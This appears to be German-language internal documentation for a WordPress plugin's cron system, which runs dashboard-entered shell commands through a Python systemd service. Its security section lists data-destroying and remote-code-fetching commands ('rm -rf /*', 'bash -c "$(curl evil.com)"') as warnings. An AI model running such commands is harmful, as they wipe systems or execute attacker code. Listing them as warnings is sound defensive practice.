# ⏰ CRON-JOB SYSTEM - COMPLETE GUIDE

**Letztes Update:** 2025-08-21  
**Status:** ✅ VOLLSTÄNDIG IMPLEMENTIERT  
**Version:** v2.0 (Production Ready)

---

## 📋 QUICK REFERENCE

| Component | Status | Location | Performance |
|-----------|--------|----------|-------------|
| Cron Engine | ✅ Aktiv | `cron/cron_engine.py` | systemd Service |
| WordPress UI | ✅ Funktional | Tab "⏰ Cron" im Dashboard | Real-time Updates |
| Database Integration | ✅ Vollständig | `stage_project_todos` | Alle Cron-Felder aktiv |
| Schedule Parser | ✅ Smart | Minutengenau bis Monatlich | Cron Expressions |
| Live Monitoring | ✅ 24/7 | Logs + Dashboard | Error Detection |

---

## 🚀 WAS IST DAS CRON SYSTEM?

Das Todo Cron System ermöglicht **zeitgesteuerte Aufgaben** direkt über das WordPress Dashboard:

### **Hauptfeatures:**
- ⏰ **Schedule:** Minutengenau, stündlich, täglich, wöchentlich, monatlich
- 🎯 **Smart Execution:** Python-basierte Engine mit Error-Handling  
- 📊 **Live Monitoring:** Real-time Status im WordPress Dashboard
- ⚡ **Manual Trigger:** Sofortige Ausführung mit Live-Output
- 🔄 **Toggle Control:** Jobs einfach aktivieren/deaktivieren

---

## 🛠️ SCHNELL-ANLEITUNG

### **1. Neuen Cron-Job erstellen:**
1. **WordPress Admin** → TODO Plugin → "Neue Aufgabe"
2. **Toggle "Als Cron-Job"** aktivieren
3. **Schedule wählen:**
   ```
   - Minutengenau: */5 * * * * (alle 5 Minuten)
   - Stündlich: 0 * * * * (zur vollen Stunde)  
   - Täglich: 0 9 * * * (täglich um 9 Uhr)
   - Wöchentlich: 0 9 * * 1 (Montags um 9 Uhr)
   - Monatlich: 0 9 1 * * (am 1. jeden Monats)
   ```
4. **Befehl eingeben:**
   ```bash
   # Beispiele:
   echo "Daily Report $(date)" >> /tmp/daily.log
   wp db query "SELECT COUNT(*) FROM wp_posts"  
   curl -X POST https://api.example.com/webhook
   ```
5. **Speichern & Aktivieren**

### **2. Cron-Jobs verwalten:**
- **Navigation:** TODO Plugin → Tab "⏰ Cron"
- **Aktionen:** ▶️ Jetzt ausführen | 🔄 Toggle An/Aus | ⚙️ Bearbeiten | 📋 Output | 🗑️ Löschen

### **3. Status prüfen:**
```bash
# System-Status
sudo systemctl status todo-cron

# Live-Logs  
tail -f /home/rodemkay/www/react/plugin-todo/cron/logs/cron_engine.log
```

---

## 🏗️ SYSTEM-ARCHITEKTUR

### **Komponenten-Übersicht:**
```
WordPress Frontend          Python Backend             System Integration
┌─────────────────────┐    ┌─────────────────────┐    ┌─────────────────────┐
│ ⏰ Cron Tab         │───▶│ cron_engine.py      │───▶│ systemd Service     │
│ 📝 Creation Form    │    │ - Schedule Parser   │    │ - 24/7 Running      │
│ 🎛️ Control Panel    │    │ - Command Executor  │    │ - Auto Restart      │
│ 📊 Live Monitoring  │◀───│ - Output Capture    │◀───│ - Resource Limits   │
└─────────────────────┘    │ - Error Handling    │    └─────────────────────┘
                           └─────────────────────┘
```

### **Dateienstruktur:**
```
📁 /home/rodemkay/www/react/plugin-todo/cron/
├── cron_engine.py          # 🚀 Haupt-Engine (Python)
├── cron_scheduler.py       # ⏰ Schedule-Management  
├── cron_executor.py        # ⚡ Command-Execution
├── requirements.txt        # 📦 Python Dependencies
└── logs/                   # 📝 Execution Logs
    ├── cron_engine.log     # Engine Status
    ├── execution_history.log # Job-Ausführungen
    └── error.log           # Fehler-Protokoll

📁 WordPress Plugin:
├── /plugins/todo/includes/class-cron-manager.php    # PHP Backend
├── /plugins/todo/admin/cron-dashboard.php           # Dashboard UI  
└── /plugins/todo/admin/new-cron.php                 # Creation Form
```

---

## 📊 DATENBANK-SCHEMA

### **Cron-spezifische Spalten (stage_project_todos):**
```sql
-- Cron-Job Felder
is_cron TINYINT(1) DEFAULT 0              -- Ist es ein Cron-Job?
cron_schedule VARCHAR(100) DEFAULT NULL    -- Schedule (daily, hourly, etc.)  
is_cron_active TINYINT(1) DEFAULT 0       -- Aktiv/Inaktiv Status
next_run DATETIME DEFAULT NULL            -- Nächste Ausführung
cron_command TEXT DEFAULT NULL            -- Auszuführender Befehl
cron_output LONGTEXT DEFAULT NULL         -- Letzte Ausgabe

-- Beispiel-Abfrage aktive Cron-Jobs:
SELECT id, title, cron_schedule, next_run, is_cron_active 
FROM stage_project_todos 
WHERE is_cron=1 AND is_cron_active=1;
```

---

## 🔧 SYSTEMD SERVICE

### **Service Status & Control:**
```bash
# Status prüfen
sudo systemctl status todo-cron

# Service starten/stoppen/neustarten
sudo systemctl start todo-cron
sudo systemctl stop todo-cron  
sudo systemctl restart todo-cron

# Auto-Start beim Boot aktivieren
sudo systemctl enable todo-cron
```

### **Service Configuration (`/etc/systemd/system/todo-cron.service`):**
```ini
[Unit]
Description=TODO Project Cron Engine
After=network.target

[Service]
Type=simple
User=rodemkay
WorkingDirectory=/home/rodemkay/www/react/plugin-todo/cron
ExecStart=/usr/bin/python3 cron_engine.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

---

## 📝 BEISPIELE & USE CASES

### **1. Täglicher Backup-Job:**
```bash
# Schedule: täglich um 2 Uhr
0 2 * * *

# Command:
cd /var/www/forexsignale/staging && wp db export /backups/backup_$(date +%Y%m%d).sql
```

### **2. Stündlicher Health-Check:**
```bash
# Schedule: stündlich zur vollen Stunde
0 * * * *

# Command:
curl -f http://forexsignale.trade/health || echo "Site down at $(date)" >> /tmp/alerts.log
```

### **3. Wöchentlicher Report:**
```bash
# Schedule: Montags um 9 Uhr
0 9 * * 1

# Command:
wp db query "SELECT COUNT(*) as posts, DATE(post_date) as date FROM wp_posts WHERE post_date > DATE_SUB(NOW(), INTERVAL 7 DAY) GROUP BY DATE(post_date)" --format=table > /tmp/weekly_report.txt
```

### **4. API Data Sync:**
```bash
# Schedule: alle 15 Minuten
*/15 * * * *

# Command:
python3 /home/rodemkay/scripts/sync_api_data.py --endpoint=https://api.forexsignale.trade/sync
```

---

## 🚨 TROUBLESHOOTING

### **Problem: Cron läuft nicht**
```bash
# 1. Service Status prüfen
sudo systemctl status todo-cron

# 2. Logs checken
tail -f /home/rodemkay/www/react/plugin-todo/cron/logs/error.log

# 3. Service neu starten
sudo systemctl restart todo-cron

# 4. Manual Test der Engine
cd /home/rodemkay/www/react/plugin-todo/cron && python3 cron_engine.py
```

### **Problem: Befehl schlägt fehl**
```bash
# 1. Error-Log analysieren
cat /home/rodemkay/www/react/plugin-todo/cron/logs/error.log | grep "ERROR"

# 2. Befehl manuell testen
cd /working/directory && your-command

# 3. Permissions prüfen
ls -la /path/to/script
whoami  # sollte 'rodemkay' sein
```

### **Problem: Schedule funktioniert nicht**
```bash
# 1. Next-Run Zeiten prüfen
wp db query "SELECT id, title, cron_schedule, next_run FROM stage_project_todos WHERE is_cron=1"

# 2. Cron Expression testen
python3 -c "from croniter import croniter; import datetime; print(croniter('0 9 * * *', datetime.datetime.now()).get_next(datetime.datetime))"

# 3. Job manuell triggern
# WordPress Dashboard → Cron Tab → "▶️ Jetzt ausführen"
```

### **Problem: Database Connection**
```bash
# 1. WordPress DB Config prüfen
cat /var/www/forexsignale/staging/wp-config.php | grep DB_

# 2. MySQL Verbindung testen
mysql -h localhost -u ForexSignale -p staging_forexsignale -e "SHOW TABLES;"

# 3. Python DB Test
python3 -c "import pymysql; print('DB connection OK')"
```

---

## 📊 MONITORING & LOGS

### **Live-Monitoring Commands:**
```bash
# Engine Status (läuft der Service?)
ps aux | grep cron_engine.py

# Live-Logs verfolgen
tail -f /home/rodemkay/www/react/plugin-todo/cron/logs/cron_engine.log

# Execution History (letzte Ausführungen)  
tail -n 20 /home/rodemkay/www/react/plugin-todo/cron/logs/execution_history.log

# Error-Log (nur Fehler)
grep "ERROR" /home/rodemkay/www/react/plugin-todo/cron/logs/error.log
```

### **Performance-Metriken:**
```bash
# CPU/Memory Usage der Engine
ps aux | grep cron_engine.py

# Anzahl aktiver Cron-Jobs
wp db query "SELECT COUNT(*) as active_jobs FROM stage_project_todos WHERE is_cron=1 AND is_cron_active=1"

# Erfolgs-Rate letzte 24h
wp db query "SELECT COUNT(*) as total, SUM(CASE WHEN cron_output NOT LIKE '%ERROR%' THEN 1 ELSE 0 END) as successful FROM stage_project_todos WHERE is_cron=1 AND updated_at > DATE_SUB(NOW(), INTERVAL 24 HOUR)"
```

---

## 🔐 SICHERHEIT & BEST PRACTICES

### **Sicherheitsmaßnahmen:**
- ✅ **User Isolation:** Cron läuft als `rodemkay` User (nicht root)
- ✅ **Command Validation:** Gefährliche Befehle werden geloggt
- ✅ **Timeout Protection:** Jobs haben 5-Minuten Timeout
- ✅ **Error Containment:** Fehler stoppen nicht die gesamte Engine
- ✅ **Log Rotation:** Automatische Log-Bereinigung

### **Best Practices:**
```bash
# ✅ GUTE Befehle (sicher, spezifisch):
wp db query "SELECT COUNT(*) FROM wp_posts"
curl -X GET https://api.example.com/status
echo "Status: OK" >> /tmp/status.log

# ❌ SCHLECHTE Befehle (vermeiden):
rm -rf /*                    # Gefährlich!
sudo systemctl restart *     # Root-Rechte
bash -c "$(curl evil.com)"   # Code-Injection
```

### **Arbeitsverzeichnis-Sicherheit:**
- Verwende **absolute Pfade** für kritische Operationen
- **Working Directory** immer explizit setzen
- **Keine temporären Downloads** in unsichere Verzeichnisse

---

## ⚡ ERWEITERTE FEATURES

### **1. Custom Cron Expressions:**
```bash
# Alle 30 Sekunden (für Testing)
*/30 * * * * *

# Werktags um 9:30 Uhr  
30 9 * * 1-5

# Jeden 1. und 15. des Monats
0 12 1,15 * *

# Alle 6 Stunden
0 */6 * * *
```

### **2. Multi-Command Jobs:**
```bash
# Mehrere Befehle mit &&
wp db export /tmp/backup.sql && gzip /tmp/backup.sql && mv /tmp/backup.sql.gz /backups/

# Conditional Execution
test -f /tmp/lock || (touch /tmp/lock && python3 /scripts/import.py && rm /tmp/lock)
```

### **3. WordPress Integration:**
```bash
# WP-CLI mit Pfad-Kontext
cd /var/www/forexsignale/staging && wp post list --post_status=publish --format=count

# Plugin-spezifische Commands  
wp todo status --format=table
wp todo cleanup --older-than=30days
```

---

## 🚀 INSTALLATION & SETUP (für neue Server)

### **1. Prerequisites installieren:**
```bash
# Python Dependencies
pip3 install -r /home/rodemkay/www/react/plugin-todo/cron/requirements.txt

# Benötigte Packages:
# - croniter (für Cron Expression Parsing)
# - pymysql (für Database Connection)  
# - requests (für HTTP Calls)
```

### **2. Systemd Service einrichten:**
```bash
# Service-Datei kopieren
sudo cp /home/rodemkay/www/react/plugin-todo/cron/todo-cron.service /etc/systemd/system/

# Service aktivieren & starten
sudo systemctl daemon-reload
sudo systemctl enable todo-cron
sudo systemctl start todo-cron

# Status verifizieren
sudo systemctl status todo-cron
```

### **3. WordPress Plugin aktivieren:**
```bash
# Plugin aktivieren (falls nicht aktiv)
wp plugin activate todo

# Database Schema prüfen (Cron-Felder sollten existieren)
wp db query "DESCRIBE stage_project_todos" | grep cron
```

### **4. Test-Job erstellen:**
```bash
# Über WordPress UI oder direkt in DB:
wp db query "INSERT INTO stage_project_todos (title, description, cron_command, cron_schedule, is_cron, is_cron_active) VALUES ('Test Cron', 'Test Job', 'echo \"Test $(date)\"', '*/5 * * * *', 1, 1)"
```

---

## 📚 VERWANDTE DOKUMENTATION

- **Todo System Übersicht:** `/docs/CURRENT_STATUS.md`
- **WordPress Plugin Details:** `/docs/IMPLEMENTATION_PLAN.md`
- **Hook System Integration:** `/docs/HOOK_SYSTEM_SOLUTION.md`
- **Environment Setup:** `/docs/ENVIRONMENT.md`
- **Database Schema:** `/docs/DATABASE_SCHEMA_REFERENCE.md` (falls verfügbar)

---

## ✅ FAZIT

Das Todo Cron System ist eine **vollständig funktionsfähige, production-ready Lösung** für zeitgesteuerte Aufgaben mit:

### **Hauptvorteile:**
- 🎯 **Benutzerfreundlich:** WordPress UI für alle Operationen
- ⚡ **Performant:** Python-Engine mit Smart Scheduling  
- 🛡️ **Sicher:** User-Isolation, Timeouts, Error-Handling
- 📊 **Transparent:** Live-Monitoring und ausführliche Logs
- 🔧 **Wartbar:** systemd Integration und automatische Recovery

### **Production-Ready Features:**
- 24/7 systemd Service mit Auto-Restart
- Comprehensive Error-Handling und Logging  
- Real-time WordPress Dashboard Integration
- Manual Trigger und Toggle Control
- Database-persistente Job-Konfiguration

Das System ist bereit für den produktiven Einsatz und kann komplexe zeitgesteuerte Workflows vollständig automatisieren! 🚀

---

**Letzte Verifikation:** 2025-08-21 - System läuft stabil ✅